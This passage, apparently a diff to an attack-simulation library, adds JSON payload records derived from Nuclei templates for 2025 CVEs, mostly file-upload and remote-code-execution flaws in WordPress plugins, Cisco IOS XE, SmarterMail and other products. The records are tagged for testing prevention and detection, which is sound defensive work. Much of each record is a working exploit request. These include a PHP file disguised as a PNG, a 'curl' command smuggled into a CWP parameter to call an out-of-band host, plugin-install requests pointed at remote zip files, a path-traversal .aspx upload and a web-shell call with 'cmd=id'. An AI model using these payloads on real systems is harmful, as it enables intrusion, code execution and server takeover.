+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-critical"
+    ],
+    "web_request_method": "POST",
+    "web_request_url": "/wp-json/gutenkit/v1/install-active-plugin",
+    "web_request_headers": [
+      {
+        "name": "Content-Type",
+        "value": "application/x-www-form-urlencoded"
+      }
+    ],
+    "web_request_body": "plugin=http://{{interactsh-url}}/{{rand_text_alpha(12)}}.zip",
+    "web_request_body_type": "form",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": ""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Cockpit < 2.4.1 - Arbitrary File Upload (Nuclei: CVE-2025-1025)",
+    "payload_external_id": "B8-UPLOAD-060",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2025-1025 by iamnoooob,rootxharsh,pdresearch] Versions of the package cockpit-hq/cockpit before 2.4.1 are vulnerable to Arbitrary File Upload where an attacker can use different extensions to bypass the upload filter.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/storage/uploads/{{upload_path}}?q={{base64(marker)}}",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [],
+    "expected_body_regex": "\\{\\{marker\\}\\}"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Melis Technology Melis Platform - Unrestricted File Upload & Remote Code Execution (Nuclei: CVE-2025-10353)",
+    "payload_external_id": "B8-UPLOAD-061",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2025-10353 by ohmygod20260203] Melis Technology Melis Platform contains an unrestricted file upload caused by insufficient validation of 'mcsdetail_img' parameter in /melis/MelisCmsSlider/MelisCmsSliderDetails/saveDetailsForm, letting attackers upload malicious files and achieve remote code execution, exploit requires crafted ...",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-critical"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/media/sliders/0/{{rand}}.txt",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": ""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Cisco IOS XE WLC - Arbitrary File Upload (Nuclei: CVE-2025-20188)",
+    "payload_external_id": "B8-UPLOAD-062",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2025-20188 by iamnoooob,pdresearch,DhiyaneshDK] A vulnerability in the Out-of-Band Access Point (AP) Image Download feature of Cisco IOS XE Software for Wireless LAN Controllers (WLCs) could allow an unauthenticated, remote attacker to upload arbitrary files to an affected system.This vulnerability is due to the presence of a hard-coded JSON W...",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-critical"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/{{randbase(8)}}.txt",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": ""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Zhiyuan OA Platform - Arbitrary File Upload (Nuclei: CVE-2025-34040)",
+    "payload_external_id": "B8-UPLOAD-063",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2025-34040 by iamnoooob,pdresearch] An arbitrary file upload vulnerability exists in the Zhiyuan OA platform 5.0, 5.1 - 5.6sp1, 6.0 - 6.1sp2, 7.0, 7.0sp1 - 7.1, 7.1sp1, and 8.0 - 8.0sp2 via the wpsAssistServlet interface. The realFileType and fileId parameters are improperly validated during multipart file uploads, allowing unauthe...",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-critical"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/{{randbase(8)}}.jsp",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [],
+    "expected_body_regex": "\\{\\{marker\\}\\}"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "WordPress Simple File List <=4.2.2 - Remote Code Execution (Nuclei: CVE-2025-34085)",
+    "payload_external_id": "B8-UPLOAD-064",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2025-34085 by princechaddha] An unrestricted file upload vulnerability in the WordPress Simple File List plugin before version 4.2.3 allows unauthenticated remote attackers to achieve remote code execution. The plugin's upload endpoint (ee-upload-engine.php) restricts file uploads based on extension, but lacks proper validat...",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-critical"
+    ],
+    "web_request_method": "POST",
+    "web_request_url": "/wp-content/plugins/simple-file-list/ee-upload-engine.php",
+    "web_request_headers": [
+      {
+        "name": "Accept",
+        "value": "*/*"
+      },
+      {
+        "name": "Content-Type",
+        "value": "multipart/form-data; boundary=6985fa39c0698d07f6d418b37388e1b2"
+      }
+    ],
+    "web_request_body": "--6985fa39c0698d07f6d418b37388e1b2\nContent-Disposition: form-data; name=\"eeSFL_ID\"\n\n1\n--6985fa39c0698d07f6d418b37388e1b2\nContent-Disposition: form-data; name=\"eeSFL_FileUploadDir\"\n\n/wp-content/uploads/simple-file-list/\n--6985fa39c0698d07f6d418b37388e1b2\nContent-Disposition: form-data; name=\"eeSFL_Timestamp\"\n\n1587258885\n--6985fa39c0698d07f6d418b37388e1b2\nContent-Disposition: form-data; name=\"eeSFL_Token\"\n\nba288252629a5399759b6fde1e205bc2\n--6985fa39c0698d07f6d418b37388e1b2\nContent-Disposition: form-data; name=\"file\"; filename=\"{{rand_base(7, \"abcdefghi\")}}.png\"\nContent-Type: image/png\n\n<?php echo md5(\"wordpress-rce-simplefilelist\");unlink(__FILE__);?>\n--6985fa39c0698d07f6d418b37388e1b2--",
+    "web_request_body_type": "multipart",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": ""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Monsta FTP <= 2.11.2 - Unauthenticated Remote Code Execution (Nuclei: CVE-2025-34299)",
+    "payload_external_id": "B8-UPLOAD-065",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2025-34299 by KrE80r] Monsta FTP = 2.11 contains an unrestricted file upload vulnerability caused by lack of authentication on file uploads, letting unauthenticated attackers execute arbitrary code by uploading crafted files.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-critical"
+    ],
+    "web_request_method": "POST",
+    "web_request_url": "/mftp/application/api/api.php",
+    "web_request_headers": [
+      {
+        "name": "Content-Type",
+        "value": "application/x-www-form-urlencoded"
+      }
+    ],
+    "web_request_body": "request={\"connectionType\":\"ftp\",\"configuration\":{\"host\":\"{{interactsh-url}}\",\"username\":\"nuclei-oast\",\"initialDirectory\":\"/\",\"password\":\"test\",\"port\":21},\"actionName\":\"downloadFile\",\"context\":{\"remotePath\":\"/test.txt\",\"localPath\":\"/tmp/nuclei-oast-test.txt\"}}",
+    "web_request_body_type": "form",
+    "expected_status_codes": [],
+    "expected_body_regex": ""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Contact Form 7 Drag and Drop Multiple File Upload - Arbitrary File Upload (Nuclei: CVE-2025-3515)",
+    "payload_external_id": "B8-UPLOAD-066",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2025-3515 by hnd3884] The Drag and Drop Multiple File Upload for Contact Form 7 plugin for WordPress is vulnerable to arbitrary file uploads due to insufficient file type validation in all versions up to, and including, 1.3.8.9. This makes it possible for unauthenticated attackers to bypass the plugin's blacklist and ...",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/wp-content/plugins/drag-and-drop-multiple-file-upload-contact-form-7/readme.txt",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [],
+    "expected_body_regex": "Drag\\ and\\ Drop\\ Multiple\\ File\\ Upload|Stable\\ tag:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Samsung MagicINFO 9 Server - File Upload & Remote Code Execution (Nuclei: CVE-2025-4632)",
+    "payload_external_id": "B8-UPLOAD-067",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2025-4632 by s4e-io] Improper limitation of a pathname to a restricted directory vulnerability in Samsung MagicINFO 9 Server version before 21.1052 allows attackers to write arbitrary file as system authority.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-critical"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/MagicInfo/{{rand_text_alpha(6)}}.html",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": ""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "TI WooCommerce Wishlist <= 2.9.2 - Arbitrary File Upload (Nuclei: CVE-2025-47577)",
+    "payload_external_id": "B8-UPLOAD-068",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2025-47577 by cehcvkr] TemplateInvaders TI WooCommerce Wishlist <= 2.10.0 contains an unrestricted file upload vulnerability caused by lack of proper file type validation, letting attackers upload web shells to the server, exploit requires no special privileges.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/wp-content/uploads/{{date_time(\"2006\")}}/{{date_time(\"01\")}}/{{rand_base(8)}}.txt",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": ""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "CWP (Control Web Panel) < 0.9.8.1205 - Remote Code Execution (Nuclei: CVE-2025-48703)",
+    "payload_external_id": "B8-UPLOAD-069",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2025-48703 by theamanrawat] CWP (Control Web Panel) < 0.9.8.1205 contains a remote code execution caused by shell metacharacters in the t_total parameter in filemanager changePerm request, letting unauthenticated attackers execute code remotely, exploit requires knowledge of a valid non-root username.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-critical"
+    ],
+    "web_request_method": "POST",
+    "web_request_url": "/{{username}}/index.php?module=filemanager&acc=changePerm",
+    "web_request_headers": [
+      {
+        "name": "Content-Type",
+        "value": "multipart/form-data; boundary=----WebKitFormBoundaryrTrcHpS9ovyhBLtb"
+      }
+    ],
+    "web_request_body": "------WebKitFormBoundaryrTrcHpS9ovyhBLtb\nContent-Disposition: form-data; name=\"fileName\"\n\n.bashrc\n------WebKitFormBoundaryrTrcHpS9ovyhBLtb\nContent-Disposition: form-data; name=\"currentPath\"\n\n/home/{{username}}\n------WebKitFormBoundaryrTrcHpS9ovyhBLtb\nContent-Disposition: form-data; name=\"recursive\"\n\n\n------WebKitFormBoundaryrTrcHpS9ovyhBLtb\nContent-Disposition: form-data; name=\"t_total\"\n\ncurl {{interactsh-url}}\n------WebKitFormBoundaryrTrcHpS9ovyhBLtb",
+    "web_request_body_type": "multipart",
+    "expected_status_codes": [],
+    "expected_body_regex": ""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "WordPress Custom Login And Signup Widget Plugin <= 1.0 - Arbitrary Code Execution (Nuclei: CVE-2025-49029)",
+    "payload_external_id": "B8-UPLOAD-070",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2025-49029 by pussycat0x] Improper Control of Generation of Code ('Code Injection') vulnerability in bitto.Kazi Custom Login And Signup Widget allows Code Injection.This issue affects Custom Login And Signup Widget: from n/a through 1.0",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "POST",
+    "web_request_url": "/wp-login.php",
+    "web_request_headers": [
+      {
+        "name": "Content-Type",
+        "value": "application/x-www-form-urlencoded"
+      }
+    ],
+    "web_request_body": "log={{username}}&pwd={{password}}&wp-submit=Log+In",
+    "web_request_body_type": "form",
+    "expected_status_codes": [],
+    "expected_body_regex": ""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "MikoPBX - Unrestricted File Upload (Nuclei: CVE-2025-52207)",
+    "payload_external_id": "B8-UPLOAD-071",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2025-52207 by darses] MikoPBX through 2024.1.114 contains an authenticated unrestricted file upload vulnerability caused by allowing PHP script uploads in PBXCoreREST/Controllers/Files/PostController.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-critical"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/pbxcore/files/cache/{{extracted_path}}?{{wait_for(3)}}",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": ""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "DNN (DotNetNuke) - Unicode Path Normalization NTLM Hash Disclosure (Nuclei: CVE-2025-52488)",
+    "payload_external_id": "B8-UPLOAD-072",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2025-52488 by assetnote,DhiyaneshDk,iamnoooob,pdresearch] DNN (formerly DotNetNuke) is an open-source web content management platform (CMS) in the Microsoft ecosystem. In versions 6.0.0 to before 10.0.1, DNN.PLATFORM allows a specially crafted series of malicious interaction to potentially expose NTLM hashes to a third party SMB server. This issue has b...",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "POST",
+    "web_request_url": "/Providers/HtmlEditorProviders/DNNConnect.CKE/Browser/FileUploader.ashx?PortalID=0&storageFolderID=1&overrideFiles=false",
+    "web_request_headers": [
+      {
+        "name": "Content-Type",
+        "value": "multipart/form-data; boundary=----WebKitFormBoundaryXXXXXXXXXXXX"
+      }
+    ],
+    "web_request_body": "------WebKitFormBoundaryXXXXXXXXXXXX\nContent-Disposition: form-data; name=\"file\"; filename=\"{{url_decode(replace(payload,'.','%EF%BC%8E'))}}\"\nContent-Type: image/jpeg\n\n{{randstr}}\n------WebKitFormBoundaryXXXXXXXXXXXX--",
+    "web_request_body_type": "multipart",
+    "expected_status_codes": [],
+    "expected_body_regex": ""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "SmarterMail - Unrestricted File Upload (Nuclei: CVE-2025-52691)",
+    "payload_external_id": "B8-UPLOAD-073",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2025-52691 by DhiyaneshDK,watchTowr] Mail server contains an unrestricted file upload vulnerability allowing unauthenticated attackers to upload arbitrary files to any location, potentially enabling remote code execution.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-critical"
+    ],
+    "web_request_method": "POST",
+    "web_request_url": "/api/upload",
+    "web_request_headers": [
+      {
+        "name": "Content-Type",
+        "value": "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW"
+      }
+    ],
+    "web_request_body": "------WebKitFormBoundary7MA4YWxkTrZu0gW\nContent-Disposition: form-data; name=\"context\"\n\nattachment\n------WebKitFormBoundary7MA4YWxkTrZu0gW\nContent-Disposition: form-data; name=\"resumableIdentifier\"\n\nfakeID\n------WebKitFormBoundary7MA4YWxkTrZu0gW\nContent-Disposition: form-data; name=\"resumableFilename\"\n\n{{to_lower(rand_text_alpha(6))}}.aspx\n------WebKitFormBoundary7MA4YWxkTrZu0gW\nContent-Disposition: form-data; name=\"contextData\"\n\n{\"guid\":\"dag/../../{{to_lower(rand_text_alpha(6))}}\"}\n------WebKitFormBoundary7MA4YWxkTrZu0gW\nContent-Disposition: form-data; name=\"whatever\"; filename=\"{{to_lower(rand_text_alpha(6))}}.jpg\"\n\nDetection Artifact Generator\n------WebKitFormBoundary7MA4YWxkTrZu0gW--",
+    "web_request_body_type": "multipart",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "\"fileName\":|\\{\"key\":"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Unauthenticated Arbitrary Plugin Upload in Alone Theme (Nuclei: CVE-2025-5394)",
+    "payload_external_id": "B8-UPLOAD-074",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2025-5394 by Nxploited,DhiyaneshDK] The Alone – Charity Multipurpose Non-profit WordPress Theme theme for WordPress is vulnerable to arbitrary file uploads due to a missing capability check on the alone_import_pack_install_plugin() function in all versions up to, and including, 7.8.3.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-critical"
+    ],
+    "web_request_method": "POST",
+    "web_request_url": "/wp-admin/admin-ajax.php",
+    "web_request_headers": [
+      {
+        "name": "Content-Type",
+        "value": "application/x-www-form-urlencoded"
+      }
+    ],
+    "web_request_body": "action=beplus_import_pack_install_plugin&data%5Bplugin_slug%5D=&data%5Bplugin_source%5D=https%3a%2f%2f{{interactsh-url}}%2fplugin%2f%7b%7b{{randstr}}%7d%7d.zip\n# No plugin is uploaded or updated; just sending interactsh-url with randstr.",
+    "web_request_body_type": "form",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": ""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Adobe Commerce - Authentication Bypass (Nuclei: CVE-2025-54236)",
+    "payload_external_id": "B8-UPLOAD-075",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2025-54236 by DhiyaneshDK,slcyber,johnk3r] Adobe Commerce versions 2.4.9-alpha2, 2.4.8-p2, 2.4.7-p7, 2.4.6-p12, 2.4.5-p14, 2.4.4-p15 and earlier are affected by an Improper Input Validation vulnerability. A successful attacker can abuse this to achieve session takeover, increasing the confidentiality, and integrity impact to high. Exploit...",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-critical"
+    ],
+    "web_request_method": "POST",
+    "web_request_url": "/customer/address_file/upload",
+    "web_request_headers": [
+      {
+        "name": "Content-Type",
+        "value": "multipart/form-data; boundary=----WebKitFormBoundaryDNFoGI9h3cNjiBCQ"
+      },
+      {
+        "name": "Cookie",
+        "value": "form_key={{rand_text_alphanumeric(16)}}"
+      }
+    ],
+    "web_request_body": "------WebKitFormBoundaryDNFoGI9h3cNjiBCQ\nContent-Disposition: form-data; name=\"form_key\"\n\n{{rand_text_alphanumeric(16)}}\n------WebKitFormBoundaryDNFoGI9h3cNjiBCQ\nContent-Disposition: form-data; name=\"custom_attributes[country_id]\"; filename=\"{{to_lower(rand_text_alpha(5))}}\"\nContent-Type: text/plain\n\n{{randstr}}\n------WebKitFormBoundaryDNFoGI9h3cNjiBCQ--\n\n{\n  \"name\": \"{{to_lower(rand_text_alpha(5))}}\",\n  \"full_path\": \"{{to_lower(rand_text_alpha(5))}}\",\n  \"type\": \"text/plain\",\n  \"tmp_name\": \"{{to_lower(rand_text_alpha(5))}}\",\n  \"error\": 0,\n  \"size\": 11,\n  \"file\": \"/t/e/{{to_lower(rand_text_alpha(5))}}\",\n  \"url\": \"{{RootURL}}/customer/address/viewfile/file/{{base64(filename)}}~~/\"\n}",
+    "web_request_body_type": "multipart",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": ""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "WordPress WPvivid Backup & Migration Plugin <= 0.9.116 - Authenticated Arbitrary File Upload (Nuclei: CVE-2025-5961)",
+    "payload_external_id": "B8-UPLOAD-076",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2025-5961 by pussycat0x] The Migration, Backup, Staging – WPvivid Backup & Migration plugin for WordPress is vulnerable to arbitrary file uploads due to missing file type validation in the 'wpvivid_upload_import_files' function in all versions up to, and including, 0.9.116.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "POST",
+    "web_request_url": "/wp-login.php",
+    "web_request_headers": [
+      {
+        "name": "Content-Type",
+        "value": "application/x-www-form-urlencoded"
+      }
+    ],
+    "web_request_body": "log={{username}}&pwd={{password}}&wp-submit=Log+In",
+    "web_request_body_type": "form",
+    "expected_status_codes": [],
+    "expected_body_regex": ""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "WPBookit <= 1.0.4 - Unauthenticated Arbitrary File Upload (Nuclei: CVE-2025-6058)",
+    "payload_external_id": "B8-UPLOAD-077",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2025-6058 by pussycat0x] The WPBookit plugin for WordPress is vulnerable to arbitrary file uploads due to missing file type validation in the image_upload_handle() function hooked via the 'add_booking_type' route in all versions up to, and including, 1.0.4.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-critical"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/wp-content/uploads/{{date_time(\"%Y/%M\")}}/{{to_lower(rand_base(5))}}.php?cmd=id",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": ""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "DNN - Unrestricted Arbitrary File Upload (Nuclei: CVE-2025-64095)",
+    "payload_external_id": "B8-UPLOAD-078",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2025-64095 by DhiyaneshDk,pussycat0x] DNN (formerly DotNetNuke) \\u003C 10.1.1 contains an unrestricted file upload vulnerability caused by the default HTML editor provider allowing unauthenticated file uploads and overwriting existing files, letting unauthenticated attackers deface websites and inject XSS payloads, exploit requires n...",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
